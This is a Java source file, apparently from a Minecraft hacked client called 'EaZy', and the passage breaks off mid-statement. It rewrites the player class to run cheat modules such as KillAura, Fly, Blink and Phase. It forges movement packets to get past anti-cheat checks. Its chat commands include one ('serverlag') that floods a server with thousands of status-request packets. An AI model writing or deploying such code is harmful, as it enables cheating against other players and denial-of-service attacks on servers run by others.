package net.minecraft.client.entity;

import java.awt.Color;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.UUID;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.lwjgl.input.Keyboard;

import com.darkmagician6.eventapi.EventManager;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonIOException;
import com.google.gson.JsonSyntaxException;
import com.mojang.authlib.Agent;
import com.mojang.authlib.exceptions.AuthenticationException;
import com.mojang.authlib.exceptions.AuthenticationUnavailableException;
import com.mojang.authlib.yggdrasil.YggdrasilAuthenticationService;
import com.mojang.authlib.yggdrasil.YggdrasilUserAuthentication;

import de.Hero.clickgui.ClickGUI;
import me.EaZy.client.Category;
import me.EaZy.client.Configs;
import me.EaZy.client.FileManager;
import me.EaZy.client.Module;
import me.EaZy.client.alts.LoginManager;
import me.EaZy.client.events.ChatMessageEvent;
import me.EaZy.client.events.EventMovePlayer;
import me.EaZy.client.events.EventPostMotionUpdates;
import me.EaZy.client.events.EventPostUpdate;
import me.EaZy.client.events.EventPreMotionUpdates;
import me.EaZy.client.events.EventPreUpdate;
import me.EaZy.client.events.EventSwingItem;
import me.EaZy.client.events.EventUpdate;
import me.EaZy.client.events.TickEvent;
import me.EaZy.client.gui.GuiHolo;
import me.EaZy.client.hooks.InGameGUIHook;
import me.EaZy.client.main.Client;
import me.EaZy.client.modules.AntiBlind;
import me.EaZy.client.modules.AutoArmor;
import me.EaZy.client.modules.BackPort;
import me.EaZy.client.modules.Blink;
import me.EaZy.client.modules.ChestStealer;
import me.EaZy.client.modules.FastUse;
import me.EaZy.client.modules.FastWeb;
import me.EaZy.client.modules.Fly;
import me.EaZy.client.modules.Fucker;
import me.EaZy.client.modules.GhostHand;
import me.EaZy.client.modules.ILikeParticles;
import me.EaZy.client.modules.InvCleaner;
import me.EaZy.client.modules.Jesus;
import me.EaZy.client.modules.KillAura;
import me.EaZy.client.modules.LongJump;
import me.EaZy.client.modules.NameProtect;
import me.EaZy.client.modules.NoKnockBack;
import me.EaZy.client.modules.NoSlowdown;
import me.EaZy.client.modules.Phase;
import me.EaZy.client.modules.Scaffold;
import me.EaZy.client.modules.Smileys;
import me.EaZy.client.modules.Spammer;
import me.EaZy.client.modules.Speed;
import me.EaZy.client.modules.Step;
import me.EaZy.client.modules.Strafe;
import me.EaZy.client.modules.Team;
import me.EaZy.client.modules.Timer;
import me.EaZy.client.modules.Tower;
import me.EaZy.client.modules.YesCheat;
import me.EaZy.client.modules.YesCheat.Mode;
import me.EaZy.client.utils.BlockUtils;
import me.EaZy.client.utils.EntityUtils;
import me.EaZy.client.utils.Friends;
import me.EaZy.client.utils.JsonUtils;
import me.EaZy.client.utils.MiscUtils;
import me.EaZy.client.utils.PlayerUtil;
import net.minecraft.block.Block;
import net.minecraft.block.material.Material;
import net.minecraft.client.Minecraft;
import net.minecraft.client.audio.MovingSoundMinecartRiding;
import net.minecraft.client.audio.PositionedSoundRecord;
import net.minecraft.client.gui.GuiCommandBlock;
import net.minecraft.client.gui.GuiEnchantment;
import net.minecraft.client.gui.GuiHopper;
import net.minecraft.client.gui.GuiMerchant;
import net.minecraft.client.gui.GuiRepair;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.GuiScreenBook;
import net.minecraft.client.gui.inventory.GuiBeacon;
import net.minecraft.client.gui.inventory.GuiBrewingStand;
import net.minecraft.client.gui.inventory.GuiChest;
import net.minecraft.client.gui.inventory.GuiCrafting;
import net.minecraft.client.gui.inventory.GuiDispenser;
import net.minecraft.client.gui.inventory.GuiEditSign;
import net.minecraft.client.gui.inventory.GuiFurnace;
import net.minecraft.client.gui.inventory.GuiScreenHorseInventory;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.client.network.NetworkPlayerInfo;
import net.minecraft.client.settings.KeyBinding;
import net.minecraft.command.CommandResultStats;
import net.minecraft.command.ICommandSender;
import net.minecraft.command.PlayerNotFoundException;
import net.minecraft.command.PlayerSelector;
import net.minecraft.command.server.CommandBlockLogic;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.entity.Entity;
import net.minecraft.entity.IMerchant;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.item.EntityMinecart;
import net.minecraft.entity.passive.EntityHorse;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.inventory.IInventory;
import net.minecraft.item.Item;
import net.minecraft.item.ItemSkull;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagDouble;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C07PacketPlayerDigging;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C0CPacketInput;
import net.minecraft.network.play.client.C0DPacketCloseWindow;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.network.play.client.C13PacketPlayerAbilities;
import net.minecraft.network.play.client.C16PacketClientStatus;
import net.minecraft.network.play.client.C16PacketClientStatus.EnumState;
import net.minecraft.network.play.server.S40PacketDisconnect;
import net.minecraft.potion.Potion;
import net.minecraft.server.MinecraftServer;
import net.minecraft.stats.StatBase;
import net.minecraft.stats.StatFileWriter;
import net.minecraft.tileentity.TileEntitySign;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.DamageSource;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumParticleTypes;
import net.minecraft.util.IChatComponent;
import net.minecraft.util.MovementInput;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.Session;
import net.minecraft.util.StringUtils;
import net.minecraft.world.IInteractionObject;
import net.minecraft.world.World;
import net.minecraft.world.WorldSettings;
import net.minecraftforge.client.model.pipeline.Sfgbsaifgboi;

public class EntityPlayerSP extends AbstractClientPlayer {

	public static final int EaZy = 453;

	@Override
	public void lambdaStuff() {
		java.util.Arrays.asList().stream().filter((m) -> (false)).forEachOrdered((m) -> {});
	}

	public final NetHandlerPlayClient sendQueue;
	private final StatFileWriter field_146108_bO;
	private double field_175172_bI;
	private double field_175166_bJ;
	private double field_175167_bK;
	private float field_175164_bL;
	private float field_175165_bM;
	private boolean field_175170_bN;
	private boolean field_175171_bO;
	private int field_175168_bP;
	private boolean field_175169_bQ;
	private String clientBrand;
	public MovementInput movementInput;
	protected Minecraft mc;

	public double groundY = 64.0f;
	public static boolean isSpectating = false;

	/**
	 * Used to tell if the player pressed forward twice. If this is at 0 and it's
	 * pressed (And they are allowed to sprint, aka enough food on the ground etc)
	 * it sets this to 7. If it's pressed and it's greater than 0 enable sprinting.
	 */
	protected int sprintToggleTimer;

	/**
	 * Ticks left before sprinting is disabled.
	 */
	public int sprintingTicksLeft;
	public float renderArmYaw;
	public float renderArmPitch;
	public float prevRenderArmYaw;
	public float prevRenderArmPitch;
	private int horseJumpPowerCounter;
	private float horseJumpPower;

	/**
	 * The amount of time an entity has been in a Portal
	 */
	public float timeInPortal;

	/**
	 * The amount of time an entity has been in a Portal the previous tick
	 */
	public float prevTimeInPortal;

	public double realPosY = 0;

	public EntityPlayerSP(final Minecraft mcIn, final World worldIn, final NetHandlerPlayClient p_i46278_3_,
			final StatFileWriter p_i46278_4_) {
		super(worldIn, p_i46278_3_.func_175105_e());
		sendQueue = p_i46278_3_;
		field_146108_bO = p_i46278_4_;
		mc = mcIn;
		dimension = 0;
	}

	/**
	 * Called when the entity is attacked.
	 */
	@Override
	public boolean attackEntityFrom(final DamageSource source, final float amount) {
		return false;
	}

	/**
	 * Heal living entity (param: amount of half-hearts)
	 */
	@Override
	public void heal(final float p_70691_1_) {}

	/**
	 * Called when a player mounts an entity. e.g. mounts a pig, mounts a boat.
	 */
	@Override
	public void mountEntity(final Entity entityIn) {
		super.mountEntity(entityIn);

		if (entityIn instanceof EntityMinecart) {
			mc.getSoundHandler().playSound(new MovingSoundMinecartRiding(this, (EntityMinecart) entityIn));
		}
	}

	public void sendMotionUpdates() {
		boolean var2;
		final EventPreMotionUpdates event = new EventPreMotionUpdates(posX, getEntityBoundingBox().minY, posZ,
				field_175172_bI, field_175166_bJ, field_175167_bK, rotationYaw, rotationPitch, field_175164_bL,
				field_175165_bM, isSprinting(), field_175171_bO, isSneaking(), field_175170_bN, onGround);
		EventManager.call(event);
		if (event.isCancelled()) {
			return;
		}
		final boolean var1 = isSprinting();
		if (var1 != field_175171_bO) {
			if (var1) {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.START_SPRINTING));
			} else {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.STOP_SPRINTING));
			}
			field_175171_bO = var1;
		}
		if ((var2 = isSneaking()) != field_175170_bN) {
			if (var2) {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.START_SNEAKING));
			} else {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.STOP_SNEAKING));
			}
			field_175170_bN = var2;
		}
		if (func_175160_A()) {
			float pitch;
			float yaw;
			if (EntityUtils.lookChanged || EntityUtils.changedlookChanged) {
				yaw = EntityUtils.yaw;
				pitch = EntityUtils.pitch;
			} else {
				yaw = rotationYaw;
				pitch = rotationPitch;
			}
			final double var3 = posX - field_175172_bI;
			final double var5 = getEntityBoundingBox().minY - field_175166_bJ;
			final double var7 = posZ - field_175167_bK;
			final double var9 = yaw - field_175164_bL;
			final double var11 = pitch - field_175165_bM;
			boolean posChanged = var3 * var3 + var5 * var5 + var7 * var7 > 9.0E-4 || field_175168_bP >= 20;
			final boolean yawpitchChanged;
			if (EntityUtils.lookChanged || EntityUtils.changedlookChanged) {
				yawpitchChanged = (EntityUtils.prevPitch != EntityUtils.pitch)
						|| (EntityUtils.prevYaw != EntityUtils.yaw);
			} else {
				yawpitchChanged = var9 != 0.0 || var11 != 0.0 || EntityUtils.changedlookChanged;
			}
			if (Blink.mod.isToggled()) {
				if (posChanged && yawpitchChanged) {
					Blink.addToBlinkQueue(new C03PacketPlayer.C06PacketPlayerPosLook(posX, getEntityBoundingBox().minY,
							posZ, yaw, pitch, onGround));
				} else if (posChanged) {
					Blink.addToBlinkQueue(new C03PacketPlayer.C04PacketPlayerPosition(posX, getEntityBoundingBox().minY,
							posZ, onGround));
				} else if (yawpitchChanged) {
					Blink.addToBlinkQueue(new C03PacketPlayer.C05PacketPlayerLook(yaw, pitch, onGround));
				} else {
					Blink.addToBlinkQueue(new C03PacketPlayer(onGround));
				}
			} else {

				if (Jesus.mod.isToggled() && YesCheat.enabled && !isInWater() && !movementInput.sneak
						&& Minecraft.theWorld.getBlockState(new BlockPos(this).add(0, -1, 0)).getBlock()
								.getMaterial() == Material.water) {
					if (posChanged) {
						sendQueue.addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(posX,
								getEntityBoundingBox().minY + (ticksExisted % 2 == 0 ? 0.05 : -0.05), posZ, yaw, pitch,
								onGround));
					} else if (yawpitchChanged) {
						sendQueue.addToSendQueue(new C03PacketPlayer.C05PacketPlayerLook(yaw, pitch, onGround));
					} else {
						sendQueue.addToSendQueue(new C03PacketPlayer(onGround));
					}
				} else if (ridingEntity == null) {
					if (posChanged && yawpitchChanged) {
						sendQueue.addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(posX,
								getEntityBoundingBox().minY, posZ, yaw, pitch, onGround));
					} else if (posChanged) {
						sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(posX,
								getEntityBoundingBox().minY, posZ, onGround));
					} else if (yawpitchChanged) {
						sendQueue.addToSendQueue(new C03PacketPlayer.C05PacketPlayerLook(yaw, pitch, onGround));
					} else {
						sendQueue.addToSendQueue(new C03PacketPlayer(onGround));
					}
				} else {
					sendQueue.addToSendQueue(
							new C03PacketPlayer.C06PacketPlayerPosLook(motionX, -999.0, motionZ, yaw, pitch, onGround));
					posChanged = false;
				}
			}
			++field_175168_bP;
			if (posChanged) {
				field_175172_bI = posX;
				field_175166_bJ = getEntityBoundingBox().minY;
				field_175167_bK = posZ;
				field_175168_bP = 0;
			}
			if (yawpitchChanged) {
				field_175164_bL = rotationYaw;
				field_175165_bM = rotationPitch;
			}
		}
		final EventPostMotionUpdates e = new EventPostMotionUpdates();
		EventManager.call(e);
	}

	/**
	 * Called to update the entity's position/logic.
	 */
	@Override
	public void onUpdate() {
		EventManager.call(new TickEvent());
		if (worldObj.isBlockLoaded(new BlockPos(posX, 0.0, posZ))) {
			super.onUpdate();
			if (isRiding()) {
				sendQueue.addToSendQueue(new C03PacketPlayer.C05PacketPlayerLook(rotationYaw, rotationPitch, onGround));
				sendQueue.addToSendQueue(
						new C0CPacketInput(moveStrafing, moveForward, movementInput.jump, movementInput.sneak));
			} else {
				final EventPreUpdate preEvent = new EventPreUpdate();
				EventManager.call(preEvent);
				if (preEvent.isCancelled()) {
					return;
				}

				sendMotionUpdates();

				final EventPostUpdate postEvent = new EventPostUpdate();
				EventManager.call(postEvent);
			}
		}
	}

	public void func_175161_p() {
		final boolean var1 = isSprinting();

		if (var1 != field_175171_bO) {
			if (var1) {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.START_SPRINTING));
			} else {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.STOP_SPRINTING));
			}

			field_175171_bO = var1;
		}

		final boolean var2 = isSneaking();

		if (var2 != field_175170_bN) {
			if (var2) {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.START_SNEAKING));
			} else {
				sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.STOP_SNEAKING));
			}

			field_175170_bN = var2;
		}

		if (func_175160_A()) {
			final double var3 = posX - field_175172_bI;
			final double var5 = getEntityBoundingBox().minY - field_175166_bJ;
			final double var7 = posZ - field_175167_bK;
			final double var9 = rotationYaw - field_175164_bL;
			final double var11 = rotationPitch - field_175165_bM;
			boolean var13 = var3 * var3 + var5 * var5 + var7 * var7 > 9.0E-4D || field_175168_bP >= 20;
			final boolean var14 = var9 != 0.0D || var11 != 0.0D;

			if (ridingEntity == null) {
				if (var13 && var14) {
					sendQueue.addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(posX,
							getEntityBoundingBox().minY, posZ, rotationYaw, rotationPitch, onGround));
				} else if (var13) {
					sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(posX,
							getEntityBoundingBox().minY, posZ, onGround));
				} else if (var14) {
					sendQueue.addToSendQueue(
							new C03PacketPlayer.C05PacketPlayerLook(rotationYaw, rotationPitch, onGround));
				} else {
					sendQueue.addToSendQueue(new C03PacketPlayer(onGround));
				}
			} else {
				sendQueue.addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(motionX, -999.0D, motionZ,
						rotationYaw, rotationPitch, onGround));
				var13 = false;
			}

			++field_175168_bP;

			if (var13) {
				field_175172_bI = posX;
				field_175166_bJ = getEntityBoundingBox().minY;
				field_175167_bK = posZ;
				field_175168_bP = 0;
			}

			if (var14) {
				field_175164_bL = rotationYaw;
				field_175165_bM = rotationPitch;
			}
		}
	}

	/**
	 * Called when player presses the drop item key
	 */
	@Override
	public EntityItem dropOneItem(final boolean p_71040_1_) {
		final C07PacketPlayerDigging.Action var2 = p_71040_1_ ? C07PacketPlayerDigging.Action.DROP_ALL_ITEMS
				: C07PacketPlayerDigging.Action.DROP_ITEM;
		sendQueue.addToSendQueue(new C07PacketPlayerDigging(var2, BlockPos.ORIGIN, EnumFacing.DOWN));
		return null;
	}

	/**
	 * Joins the passed in entity item with the world. Args: entityItem
	 */
	@Override
	protected void joinEntityItemWithWorld(final EntityItem p_71012_1_) {}

	/**
	 * Sends a chat message from the player. Args: chatMessage
	 */
	public void sendChatMessage(String chatMessage) {
		// TODO
		final String[] cmd = chatMessage.split(" ");
		if (cmd[0].startsWith("*") && !Client.theClient.getIrcManager().isConnected() && !Client.isHidden) {
			new Thread("EaZy IRC Connector") {
				@Override
				public void run() {
					Client.theClient.getIrcManager().connect();
				};
			}.start();
			msg("Connecting to IRC...");
			return;
		}

		final ChatMessageEvent event = new ChatMessageEvent(chatMessage);
		EventManager.call(event);
		if (event.isCancelled()) {
			return;
		}
		if (cmd[0].startsWith(Configs.commandPrefix) && !Client.isHidden) {
			if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "help")) {
				String str = "";
				int ModCounter = 0;
				for (final Module mod : Client.getModules()) {
					if (mod.getCategory() == Category.HIDDEN) {
						continue;
					}
					++ModCounter;
					str = str.isEmpty() ? String.valueOf(String.valueOf(str)) + "§a" + mod.getName()
							: String.valueOf(String.valueOf(str)) + "§8, §a" + mod.getName();
				}
				msg("§eMods §6(" + ModCounter + ")§e: " + str);
				String str2 = "";
				int CMDCounter = 0;
				for (final String cmds : Client.getCmds()) {
					++CMDCounter;
					str2 = str2.isEmpty() ? String.valueOf(String.valueOf(str2)) + "§a" + cmds
							: String.valueOf(String.valueOf(str2)) + "§8, §a" + cmds;
				}
				msg("§eCommands §6(" + CMDCounter + ")§e: " + str2);
				msg("§eIRC-Help:");
				msg("§7*§a[Message]§7: §6Write a message");
				msg("§7*§alist§7: §6Show all online users");
				msg("§7*§amsg [User] [Message]§7: §6Write a private message to [User]");
				msg("§7*§ainfo [User]§7: §6Show information from a user");
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "gm")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("0")) {
							Minecraft.playerController.setGameType(WorldSettings.GameType.SURVIVAL);
							addChatMessage(new ChatComponentText("§6Gamemode: §cSURVIVAL"));
							sendChatMessage("/gamemode 0");
						}
						if (args[1].equalsIgnoreCase("1")) {
							Minecraft.playerController.setGameType(WorldSettings.GameType.CREATIVE);
							addChatMessage(new ChatComponentText("§6Gamemode: §cCREATIVE"));
							sendChatMessage("/gamemode 1");
						}
						if (args[1].equalsIgnoreCase("2")) {
							Minecraft.playerController.setGameType(WorldSettings.GameType.ADVENTURE);
							msg("§6Gamemode: §cADVENTURE");
							sendChatMessage("/gamemode 2");
						}
						if (args[1].equalsIgnoreCase("3")) {
							Minecraft.playerController.setGameType(WorldSettings.GameType.SPECTATOR);
							msg("§6Gamemode: §cSPECTATOR");
							sendChatMessage("/gamemode 3");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §agm [0/1/2/3]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "kr")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						final double val2 = Double.parseDouble(args[1]);
						if (val2 <= 6.0 && val2 >= 0.0) {
							Client.setmgr.getSettingByName(KillAura.mod, "Range").setValFloat((float) val2);
							msg("§aKillAura-Range set to: §6"
									+ Client.setmgr.getSettingByName(KillAura.mod, "Range").getValFloat());
						} else {
							msg("§4KillAura-Range could not be updated!");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §akr [KillAura-Range]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "ks")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						final float val = Float.parseFloat(args[1]);
						Client.setmgr.getSettingByName(KillAura.mod, "Delay").setValFloat(val);
						msg("§aKillAura-Delay set to: §6" + args[1]);
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §aks [KillAura-Delay in MS]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "timer")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						final float val3 = Float.parseFloat(args[1]);
						if ((double) val3 > 0 && val3 <= 10.0f) {
							Client.setmgr.getSettingByName(Timer.mod, "Speed").setValFloat(val3);
							msg("§aTimer-Speed set to: §6"
									+ Client.setmgr.getSettingByName(Timer.mod, "Speed").getValFloat());
						} else {
							msg("§4Timer-Speed could not be updated!");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §atimer [Timer-Speed]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "clearchat")) {
				mc.ingameGUI.getChatGUI().clearChatMessages();
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "tp")) {
				switch (cmd.length) {
				case 4:
					try {
						final String[] args = chatMessage.split(" ");
						final double x = args[1].startsWith("~")
								? args[1].equals("~") ? Minecraft.thePlayer.posX
										: Minecraft.thePlayer.posX + Double.parseDouble(args[1].substring(1))
								: Double.parseDouble(args[1]);
						final double y = args[2].startsWith("~")
								? args[2].equals("~") ? (int) Minecraft.thePlayer.posY
										: (int) Minecraft.thePlayer.posY + Double.parseDouble(args[2].substring(1))
								: Double.parseDouble(args[2]);
						final double z = args[3].startsWith("~")
								? args[3].equals("~") ? Minecraft.thePlayer.posZ
										: Minecraft.thePlayer.posZ + Double.parseDouble(args[3].substring(1))
								: Double.parseDouble(args[3]);
						setPosition(x, y, z);
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
					break;
				case 2:
					try {
						final String[] args = chatMessage.split(" ");
						for (final Object entity : Minecraft.theWorld.loadedEntityList) {
							EntityOtherPlayerMP player;
							if (!(entity instanceof EntityOtherPlayerMP)
									|| !(player = (EntityOtherPlayerMP) entity).getName().equals(args[1])) {
								continue;
							}
							final double valx = player.posX;
							final double valy = player.posY;
							final double valz = player.posZ;
							setPosition(valx, valy, valz);
							return;
						}
						msg("§cSomething went wrong. :(");
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
					break;
				default:
					msg("§6Syntax: §atp [Name / [X Y Z]]");
					break;
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "rename")) {
				if (!capabilities.isCreativeMode) {
					msg("§4Error: §cCreative-Mode only!");
					return;
				}
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						final ItemStack item3 = getCurrentEquippedItem();
						String message = args[1];
						if (item3 != null) {
							int i = 1;
							while (++i < args.length) {
								message = String.valueOf(message) + " " + args[i];
							}
							item3.setStackDisplayName(message);
							msg("§3Successfully renamed: §c" + message);
						} else {
							msg("§cYou are not holding an item!");
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					try {
						final ItemStack item2 = getCurrentEquippedItem();
						if (item2 != null) {
							item2.setStackDisplayName("");
							msg("§3Successfully renamed to nothing!");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "t")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args.length > 2) {
							msg("§6Haha, denkste wohl! xD");
							return;
						}
						for (final Module mods : Client.getModules()) {
							if (!mods.getName().equalsIgnoreCase(args[1]) && !mods.alias.equalsIgnoreCase(args[1])) {
								continue;
							}
							Client.toggle(mods.getName());
							msg("§6" + mods.getName() + (mods.isToggled() ? " §aenabled!" : " §4disabled!"));
							return;
						}
						msg("§cNo Module named §6\"" + args[1] + "\" §cfound.");
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §at [Module]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "friend")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (args[1].equalsIgnoreCase("add")) {
							switch (args.length) {
							case 3:
								Friends.add(args[2]);
								FileManager.saveFriends();
								msg("§6" + args[2] + " §aadded!");
								break;
							case 4:
								Friends.add(args[2], args[3].replace(":", "").replace("\n", "").replace("\r", ""));
								FileManager.saveFriends();
								msg("§6" + args[2] + " §aadded as §6"
										+ args[3].replace(":", "").replace("\n", "").replace("\r", "") + "§a!");
								break;
							default:
								msg("§6Syntax: §afriend add [Name] (Nick)");
								break;
							}
						}
						if (args[1].equalsIgnoreCase("remove")) {
							if (args.length == 3) {
								if (args[2].equalsIgnoreCase("all")) {
									Friends.friends.clear();
									msg("§6All Friends §cremoved!");
								} else {
									final boolean b = Friends.remove(args[2]);
									FileManager.saveFriends();
									if (b) {
										msg("§6" + args[2] + " §cremoved!");
									} else {
										msg("§6" + args[2] + " §4was not friended!");
									}
								}
							} else {
								msg("§6Syntax: §afriend remove [Name/all]");
							}
						}
						if (args[1].equalsIgnoreCase("reload")) {
							Friends.friends.clear();
							FileManager.loadFriends();
							msg("§aFriend file reloaded!");
						}
						if (args[1].equalsIgnoreCase("list")) {
							if (!Friends.friends.isEmpty()) {
								Friends.getFriends().forEach((friend) -> {
									if (friend.getUsername().equals(friend.getNick())) {
										msg("§3" + friend.getUsername());
									} else {
										msg("§3" + friend.getUsername() + " §aas §3" + friend.getNick());
									}
								});
							} else {
								msg("§cYou don\'t have friends. :(");
							}
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §afriend [add [Name] / remove [Name] / reload / list");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "serverlag")) {
				try {
					final String[] args = chatMessage.split(" ");
					if (args.length == 1) {
						final C16PacketClientStatus p = new C16PacketClientStatus(EnumState.REQUEST_STATS);
						int i = 0;
						while (i < 10000) {
							Minecraft.getNetHandler().addToSendQueue(p);
							++i;
						}
					} else {
						final C16PacketClientStatus p = new C16PacketClientStatus(EnumState.REQUEST_STATS);
						int i = 0;
						while (i < Integer.parseInt(args[1])) {
							Minecraft.getNetHandler().addToSendQueue(p);
							++i;
						}
					}
				} catch (final Exception exception) {
					msg("§4Error: §c" + exception.toString());
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "viewbarrier")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("true")) {
							WorldClient.showBarrier = true;
							msg("§3You now see Barriers!");
						}
						if (args[1].equalsIgnoreCase("false")) {
							WorldClient.showBarrier = false;
							msg("§3You no longer see Barriers!");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §aviewbarrier [true/false]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "sc")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "scaffold")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (args.length == 3) {
							if (args[1].equalsIgnoreCase("aac")) {
								if (MiscUtils.isBoolean(args[2])) {
									Client.setmgr.getSettingByName(Scaffold.mod, "Expanded")
											.setValBoolean(Boolean.parseBoolean(args[2].toLowerCase()));
									msg("§aSet Scaffold AAC to " + args[2].toLowerCase() + "!");
								} else {
									msg("§cPlease type true or false!");
								}
							}
							if (args[1].equalsIgnoreCase("expand") || args[1].equalsIgnoreCase("ex")
									|| args[1].equalsIgnoreCase("e")) {
								if (MiscUtils.isFloat(args[2]) && Float.parseFloat(args[2]) >= 1
										&& Float.parseFloat(args[2]) <= 10) {
									Client.setmgr.getSettingByName(Scaffold.mod, "Expand")
											.setValFloat(Float.parseFloat(args[2]));
									msg("§aSet Scaffold Expand to " + args[2].toLowerCase() + "!");
								} else {
									msg("§cPlease a number between 1 and 10!");
								}
							}
						} else {
							msg("§6Syntax: §asc [AAC [true/false] / Expand [1-10]]");
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §asc [AAC [true/false] / Expand [1-10]]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "fu")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("instant")) {
							Client.setmgr.getSettingByName(FastUse.mod, "Instant").setValBoolean(true);
							msg("§3FastUse set to INSTANT!");
						}
						if (args[1].equalsIgnoreCase("fast")) {
							Client.setmgr.getSettingByName(FastUse.mod, "Instant").setValBoolean(false);
							msg("§3FastUse set to NORMAL!");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6FastUse-Modes: §4"
							+ (Client.setmgr.getSettingByName(FastUse.mod, "Instant").getValBoolean() ? "instant"
									: "fast"));
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "fly")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("speed")) {
							final Float val4 = Float.parseFloat(args[2]);
							Client.setmgr.getSettingByName(Fly.mod, "Speed").setValFloat(val4);
							msg("§6Fly-Speed set to: §4"
